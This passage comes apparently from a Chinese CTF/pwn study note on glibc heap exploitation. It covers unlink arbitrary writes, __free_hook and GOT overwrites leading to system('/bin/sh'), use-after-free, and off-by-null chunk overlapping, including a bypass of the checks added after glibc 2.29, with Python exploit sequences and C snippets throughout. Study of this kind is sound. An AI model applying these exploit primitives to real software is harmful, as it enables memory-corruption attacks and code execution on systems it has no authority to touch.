<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>P</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>prev_size</span> <span class=p>(</span><span class=nf>next_chunk</span><span class=p>(</span><span class=n>P</span><span class=p>)),</span> <span class=mi>0</span><span class=p>))</span></span></span></code></pre></div></div><p>需要将伪造的 chunk 的 size 设置为与下一个 chunk 的 prev_size 位相等，2.27 也可以设 prev_size 和 size 为 0</p></li></ol><p><strong>原理</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20241124144320139.png alt=图片无法加载><ul><li>释放 chunk2 使得与 fake chunk 合并，最终使得目标 P1 指向 P1 - 0x18，即 P1 中内容为 P1-0x18 的地址，fake chunk 进入 unsorted bin 中</li><li>此时向 P1 中写数据，实际是向 P1 指向的指针数组的第一项内写数据，可以写入<code>__free_hook</code>地址，再向指针数组第一项内写数据即向<code>__free_hook</code>所在地址写数据，写入<code>system</code>函数地址，此时 free 一个写了<code>/bin/sh</code>内容的堆块可以 get shell</li></ul><p><strong>老版本利用：无对 chunk 的 size 检查和双向链表检查</strong></p><img src=/img/pwn_note.zh-cn.assets/172844676894983.png alt=图片无法加载><p><strong>free(Q)时</strong></p><ul><li>前向合并，前 chunk use，不合并</li><li>后向合并，后 chunk free，合并，对<code>N</code>进行<code>unlink</code></li></ul><p><strong>unlink 执行效果——64 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>FD</span><span class=o>=</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>target</span> <span class=n>addr</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>BK</span><span class=o>=</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>expect</span> <span class=n>value</span> <span class=c1>// 变式: = target addr - 0x10
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>FD</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>BK</span><span class=err>，即</span> <span class=o>*</span><span class=p>((</span><span class=n>target</span> <span class=n>addr</span> <span class=o>-</span> <span class=mh>0x18</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>)</span> <span class=o>=</span> <span class=n>BK</span> <span class=o>=</span> <span class=n>expect</span> <span class=n>value</span> <span class=c1>// 任意地址写
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BK</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>FD</span><span class=err>，即</span> <span class=o>*</span><span class=p>(</span><span class=n>expect</span> <span class=n>value</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>=</span> <span class=n>FD</span> <span class=o>=</span> <span class=n>target</span> <span class=n>addr</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl>     <span class=c1>// 变式: = *(target addr) 即第四步将是任意地址写, 目标地址内容更改为(目标地址-0x18)
</span></span></span></code></pre></div></div><ul><li>实现**任意地址写：**向可写地址<code>target addr</code>中写入<code>expect value</code>，<strong>其中 expect value + 0x10 地址具有可写的权限</strong></li><li>此时可以将存储<code>malloc</code>地址的<code>recordlist[2]</code>内容覆盖为恶意地址<code>recordlist[2]-0x18=recordlist[0]</code>，修改可以将 malloc 数组全部指针修改为其他的地址并通过<code>change</code>写入恶意内容</li></ul><img src=/img/pwn_note.zh-cn.assets/172844676894984.png alt=图片无法加载><p>构造链模版<strong>不完全 RELRO 泄露 libc 基址+getshell</strong></p><ul><li><p>编辑<code>r[2]</code>覆写为<code>free</code>函数的<code>got</code>表，再编辑<code>r[0]</code>把 free 函数的 got 表覆写为<code>puts</code>函数的<code>plt</code>表，编辑<code>r[2]</code>使得<code>r[0]</code>覆写为<code>puts</code>函数的<code>got</code>表，<code>free(r[0]) = puts_plt(puts_got)</code>输出 puts 真实地址，获取<strong>libc 基址</strong></p></li><li><p>同样的方法，将<code>free</code>函数的<code>got</code>表覆写为<code>system</code>函数的真实地址，<code>free</code>写有"/bin/sh"的堆</p></li></ul><h4 id=uaf>UAF</h4><ul><li><p>Use after free，内存块被释放之后再次被使用，关键在于<strong>指针未被设置为 NULL</strong></p></li><li><p>即原先指针并没有消失，fastbins 或 tcache 中新增了指针将 chunk 连成链表</p></li></ul><p><strong>漏洞点：</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>o</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x28uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>free</span><span class=p>(</span><span class=n>o</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x20uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>32LL</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>    <span class=c1>// 向s指向的地址写数据
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>free</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=o>*</span><span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>**</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>))</span><span class=n>o</span> <span class=o>+</span> <span class=mi>3</span><span class=p>))(</span><span class=n>o</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>利用</strong>：o+3 是调用 func1，但篡改后相当于调用 shellcode</p><img src=/img/pwn_note.zh-cn.assets/172844670575454.png alt=图片无法加载><p><strong>hacknote</strong>基本实现：一次 malloc 两个堆块，且第一个堆块固定为 8 字节，第二个堆块自己申请</p><img src=/img/pwn_note.zh-cn.assets/172844670575455.png alt=图片无法加载><p>此处也存在<strong>漏洞点</strong>：打印为<code>(*notelist[i])(notelist[i])</code>调用 puts 打印 content 内容（32 位下）</p><p>利用方法：先申请两个远大于 0x8 的 note0, note1，共 4 个堆块，删除 0，删除 1，进入相应 fastbin 中，再申请 0x8 的 note 并修改 print_note，调用 print_note 即调用 system 函数</p><img src=/img/pwn_note.zh-cn.assets/172844670575456.png alt=图片无法加载><h4 id=off-by-null>Off-by-null</h4><p><strong>off-by-one</strong>：更改后一块的<code>size</code>位，用于合并堆块造成堆块重叠</p><p><strong>poison null byte</strong>：适用于 libc-2.27</p><p>**漏洞点：**程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=p>;</span><span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>i</span> <span class=o>&gt;</span> <span class=n>length</span><span class=p>)</span> <span class=k>break</span> <span class=c1>//i=length时多写一个
</span></span></span></code></pre></div></div><p><strong>利用其实现 unsorted bin leak</strong></p><ul><li><p>构造 0,1,2,3 四个堆块，修改 0 堆块内容溢出一字节到 1 堆块，更改 size 覆盖 1 和 2 堆块，此时 1 和 2 堆块被系统误认为一个堆块</p></li><li><p>释放 1 堆块，1 和 2 合并堆块进入 unsorted bin，大小大于 0x80，再申请一个和 1 堆块大小相等的堆块</p></li><li><p>此时 unsorted bin 分割，只存有 2 堆块，2 堆块的 fd 和 bk 都指向一个地址，访问 2 堆块可以泄露 main_arena 相关地址</p></li></ul><h3 id=堆叠>堆叠</h3><p>通过堆块堆叠，使一个堆块可控制另一个堆块头部，比 UAF 只能控制 fd 和 bk 字段多了可控制的 prev_size 和 size 字段</p><h4 id=uaf-1>UAF</h4><p><strong>UAF 转堆叠</strong></p><p>glibc-2.23 中 fastbin 为例，在堆块内存区域伪造 chunk size，UAF 部分地址写将 fd 修改到伪造 chunk 头部，将 fake chunk 申请达成堆叠</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x60</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x81</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span> <span class=c1># 覆盖fd末尾一字节为00指向前面edit的fake chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241130124443597.png alt=图片无法加载><h4 id=off-by-one>off-by-one</h4><p><strong>off-by-null 转堆叠(旧)</strong></p><p>① 可控制<code>prev_size</code>和<code>size</code></p><ul><li><p>glibc&lt;2.29，前后向合并未检查<code>prev_size</code>与前一个相邻堆块的<code>size</code>是否相等</p></li><li><p>控制下一个堆块的<code>prev_size</code>和<code>size</code>最低 1 字节写 0</p></li><li><p>释放 chunk1，修改 chunk3 的<code>prev_size</code>和<code>PREV_INUSE</code>位，释放 chunk3 与 chunk1 合并造成堆叠</p></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241215152616483.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># chunk1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># chunk2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x1f0</span><span class=p>)</span> <span class=c1># chunk3 [0x1f0 + 0x10 = 0x200]</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span> <span class=c1># 分隔top chunk</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># chunk1进入unsorted bin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># off-by-null</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x230</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span> <span class=c1># prev_size: 0x230 为chunk1和2大小</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 将chunk1从unsorted bin中unlink出来，与chunk3合并再放入unsorted bin中，此时chunk2在合并后chunk3中</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># 此时，chunk3大小为0x430=0x210 + 0x20 + 0x200</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x428</span><span class=p>)</span> <span class=c1># 申请chunk3出来</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># 释放chunk2，通过对chunk0修改可以编辑free chunk2</span></span></span></code></pre></div></div><p>② 只可控堆块的<code>size</code>最低 1 字节</p><img src=/img/pwn_note.zh-cn.assets/image-20241215162113697.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># chunk1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x408</span><span class=p>)</span> <span class=c1># chunk2 用于堆叠</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x2f0</span><span class=p>)</span> <span class=c1># chunk3</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>)</span> <span class=c1># 隔开top chunk</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span> <span class=c1># off-by-null修改了free chunk2的size, 0x410 -&gt; 0x400</span>
</span></span><span class=line><span class=cl><span class=c1># 从 chunk2 切割四块</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x1f0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span> <span class=c1># 分割防止后向合并</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x1f0</span> <span class=o>-</span> <span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># 合并为0x710大小的chunk</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=c1># 释放6不会前后向合并因为有5,7包着, 进入unsorted bin且可编辑</span></span></span></code></pre></div></div><p><strong>off-by-null 转堆叠(新)</strong></p><ul><li>glibc>2.29，合并堆块时加入检查，<code>prev_size</code>以及根据<code>prev_size</code>找到的相邻堆块<code>size</code>是否相同</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>!=</span> <span class=n>prevsize</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;corrupted size vs. prev_size while consolidating&#34;</span><span class=p>);</span></span></span></code></pre></div></div><ul><li>unlink 加入检查</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>chunksize</span> <span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>prev_size</span> <span class=p>(</span><span class=nf>next_chunk</span> <span class=p>(</span><span class=n>p</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;corrupted size vs. prev_size&#34;</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>绕过</strong></p><ul><li><code>chunksize(p) == prevsize</code> 和 unlink 中 <code>chunksize(p) == prev_size(next_chunk(p))</code>可以同时满足</li><li><code>fd->bk == bk->fd == p</code> ， <code>p->fd_nextsize == NULL</code>绕过对两个 nextsize 指针的双向链表检查</li></ul><p><strong>利用</strong>：</p><ul><li>在不泄露堆地址的情况下构造满足 <code>fd->bk == bk->fd == p </code>的 <strong>fake chunk</strong>（图省略 data 段）</li><li>注意利用过程中为何可以使用 off-by-null，是因为 chunk4 在 chunk3 中且刚好在 chunk10-0x20 位置</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241218152800794.png alt=图片无法加载><p>① 伪造出 fake chunk 4 的 fd 和 bk 分别指向 chunk1 和 chunk6</p><img src=/img/pwn_note.zh-cn.assets/image-20241218142727180.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 1st</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># 这个chunk的作用是利用off-by-null时使得两个地址倒数第三位相同，覆盖最低字节为00后可以使得地址向上偏移</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x438</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x428</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 2nd</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 3rd</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># 3 会与 4 合并</span>
</span></span><span class=line><span class=cl><span class=c1># 4th</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x438</span><span class=p>)</span> <span class=c1># 申请合并的3+4chunk</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xa91</span><span class=p>))</span> <span class=c1># 伪造size, 0xa91视情况而定</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># unsorted bin 取出</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x428</span><span class=p>)</span> <span class=c1># large bin 取出</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># large bin 取出</span></span></span></code></pre></div></div><p>② 利用 unsorted bin 伪造 chunk1 的 bk</p><img src=/img/pwn_note.zh-cn.assets/image-20241218150334780.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 1st 进入unsorted bin，此时chunk1 bk指向chunk10</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 2nd 申请出chunk1，off-by-null将bk最低字节覆盖为chunk4的prev_size</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 3rd 申请出unsorted bin中剩余chunk</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span></span></span></code></pre></div></div><p>③ unsorted bin 从 bk 开始取，因此借助 large bin 和部分覆盖来伪造 chunk6 的 fd</p><img src=/img/pwn_note.zh-cn.assets/image-20241218153850945.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 1st 先进入unsorted bin, 再进入largebin</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span> <span class=mh>0x9f8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 2nd 申请出chunk6，off-by-null修改其fd</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x428</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 3rd 申请出large bin剩余chunk</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span></span></span></code></pre></div></div><p>④ 完成堆叠</p><img src=/img/pwn_note.zh-cn.assets/image-20241218155502252.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 1st 隔开top chunk</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>12</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 2nd 修改7覆盖chunk11的prev_size为0xa90以及超出一位覆盖PREV_INUSE位为0</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xa90</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 释放chunk4完成堆叠</span>
